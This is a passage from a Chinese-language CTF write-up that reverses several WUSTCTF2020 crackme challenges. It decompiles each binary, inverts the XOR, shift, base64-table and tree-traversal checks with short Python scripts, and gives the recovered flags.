        133&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 191&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 134&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 140&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 129&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 135&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 191&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 65 &lt;span style=&#34;color:#f92672&#34;&gt;};&lt;/span&gt;
    ArrayList&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;Integer&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; KEYList &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ArrayList&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;gt;();&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; KEY&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; j&lt;span style=&#34;color:#f92672&#34;&gt;++)&lt;/span&gt;
      KEYList&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Integer&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;valueOf&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;KEY&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;j&lt;span style=&#34;color:#f92672&#34;&gt;]));&lt;/span&gt; 
    System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Result:&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Resultlist&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;equals&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;KEYList&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
      System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Congratulations);
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    } else {
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;      System.err.println(&amp;#34;&lt;/span&gt;Error&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; 
  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这段代码就是将输入的每个字符加64后与0x20进行异或&lt;/p&gt;
&lt;p&gt;因此使用python进行暴力破解（其实完全可以反向计算就出来的，当时大意了）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;180&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;136&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;137&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;147&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;191&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;137&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;147&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;191&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;136&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;133&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;191&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;134&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;140&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;129&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;135&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;191&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;]
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; k &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; key:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (c &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; k:
            print chr(c)
&lt;span style=&#34;color:#75715e&#34;&gt;# This_is_the_flag_!&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;wustctf2020crossfun&#34;&gt;[WUSTCTF2020]Crossfun&lt;/h2&gt;
&lt;p&gt;拖入ida，发现有个判断函数，里面对输入的每个字符进行了判断，把所有判断函数整合起来，就得到flag了&lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;wctf2020{cpp_@nd_r3verse_@re_fun}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;wustctf2020level1&#34;&gt;[WUSTCTF2020]level1&lt;/h2&gt;
&lt;p&gt;拖入ida&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;stream &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fopen(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;);
fread(ptr, &lt;span style=&#34;color:#ae81ff&#34;&gt;1uLL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14uLL&lt;/span&gt;, stream);
fclose(stream);
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i ) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%ld&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(ptr[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; i));
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%ld&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ptr[i]));
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;显然 &lt;code&gt;ptr&lt;/code&gt; 里面就是flag&lt;/p&gt;
&lt;p&gt;看到 output.txt 里面正好有19行&lt;/p&gt;
&lt;p&gt;对其进行逆变换（注意0）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;198&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;232&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;816&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1536&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6144&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;984&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51200&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;570&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;92160&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1200&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;565248&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;756&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1474560&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;800&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6291456&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1782&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;65536000&lt;/span&gt;]
flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(ptr[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; i)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(ptr[i] &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; i)

print (flag)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到flag &lt;code&gt;ctf2020{d9-dE6-20c}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;wustctf2020level2&#34;&gt;[WUSTCTF2020]level2&lt;/h2&gt;
&lt;p&gt;先使用upx进行脱壳&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;upx -d attachment
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;进入main函数&lt;/p&gt;
&lt;p&gt;还没来得及按 &lt;code&gt;tab&lt;/code&gt; 前就看到了flag&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;; __unwind {
lea     ecx, [esp+4]
and     esp, 0FFFFFFF0h
push    dword ptr [ecx-4]
push    ebp
mov     ebp, esp
push    ecx
sub     esp, 14h
mov     [ebp+var_C], offset flag ; &amp;quot;wctf2020{Just_upx_-d}&amp;quot;
sub     esp, 0Ch
push    offset aWhereIsIt ; &amp;quot;where is it?&amp;quot;
call    puts
add     esp, 10h
mov     eax, 0
mov     ecx, [ebp+var_4]
leave
lea     esp, [ecx-4]
retn
; } // starts at 804887C
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这件事情告诉我们还是要看汇编代码的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{Just_upx_-d}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;wustctf2020level3&#34;&gt;[WUSTCTF2020]level3&lt;/h2&gt;
&lt;p&gt;首先尝试运行程序，发现是一个base64编码程序&lt;/p&gt;
&lt;p&gt;进行测试后看到程序中输出一个字符串 &lt;code&gt;Is there something wrong?&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;推测这个base64可能不正确&lt;/p&gt;
&lt;p&gt;使用在线工具测试后发现大写字母出现错误&lt;/p&gt;
&lt;p&gt;查看base64_table字符串，发现没有问题，说明源代码中有对字符串进行操作的部分&lt;/p&gt;
&lt;p&gt;查看源代码，发现一个函数是 &lt;code&gt;O_OLootAtYou&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i ) {
    v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64_table[i];
    base64_table[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64_table[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; i];
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; i;
    base64_table[result] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;主函数中说有一个奇怪的字符串，显然是用错误的加密得到的结果&lt;/p&gt;
&lt;p&gt;对其进行更正后解密&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64

str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&amp;#34;&lt;/span&gt;
table &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; str:
    table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(c)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;):
    c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; table[i]
    table[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; table[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; i]
    table[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; c

crypto &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&amp;#34;&lt;/span&gt;
msg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(crypto)):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ord(crypto[i]) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; ord(crypto[i]) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Z&amp;#39;&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; table[j] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; crypto[i]:
                msg &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        msg &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; crypto[i]
print (msg)
print (base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(msg))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行得到flag为 &lt;code&gt;wctf2020{Base64_is_the_start_of_reverse}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;wustctf2020level4&#34;&gt;[WUSTCTF2020]level4&lt;/h2&gt;
&lt;p&gt;运行一下程序，发现这道题和结构体有关&lt;/p&gt;
&lt;p&gt;拖入ida&lt;/p&gt;
&lt;p&gt;看到主函数中输出的是type1和type2函数的结果&lt;/p&gt;
&lt;p&gt;查看type1和type2&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( a1 ) {
    type1(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
    putchar(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1);
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; type1(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;));
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( a1 ) {
    type2(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
    type2(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;));
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; putchar(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;明显是二叉树的中序遍历和后序遍历&lt;/p&gt;
&lt;p&gt;反推出前序遍历，得到flag: &lt;code&gt;wctf2020{This_IS_A_7reE}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;wustctf2020funnyre&#34;&gt;[WUSTCTF2020]funnyre&lt;/h2&gt;
&lt;p&gt;拖入ida后，通过start函数进入main&lt;/p&gt;
&lt;p&gt;发现main函数未定义，按p创建函数后F5，查看代码&lt;/p&gt;
&lt;p&gt;看到一串如下代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v6 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v7&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x91u&lt;/span&gt;;       &lt;span style=&#34;color:#75715e&#34;&gt;// 每一项异或0x91
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v7 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; );
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;除此之外，还有一些错误代码标红&lt;/p&gt;
&lt;p&gt;以及JUMPOUT函数&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    JUMPOUT(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;loc_400B81 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
    JUMPOUT(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;loc_400B81 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
    v89 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MEMORY[&lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFFFFFFF81003D16&lt;/span&gt;](v6);
    JUMPOUT(v91, (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;loc_400B88 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
